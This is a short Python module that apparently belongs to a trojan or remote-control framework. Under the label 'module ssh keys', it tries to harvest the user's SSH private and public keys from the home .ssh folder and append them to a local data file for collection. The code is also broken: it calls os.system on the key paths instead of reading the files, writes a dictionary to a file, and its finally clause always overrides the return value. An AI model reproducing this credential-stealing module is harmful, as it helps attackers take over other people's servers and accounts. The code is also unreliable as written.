import os


def run(**args):
    print(args)
    print("[*] In module ssh keys")

    try:
        privkey = os.system("/home/$USER/.ssh/id_rsa")
        pubkey = os.system("/home/$USER/.ssh/id_rsa.pub")
        if privkey is not None or pubkey is not None:
            keys = {"private": privkey, "pubkey": pubkey}
            f = open("./data/keys", "a")
            f.write(keys)
            f.close()
        else:
            f = open("./data/keys", "a")
            f.write("No keys could be found")
            f.close()
        return keys

    except:
        print("[x] no keys could be found")

    finally:
        return "No keys could be found"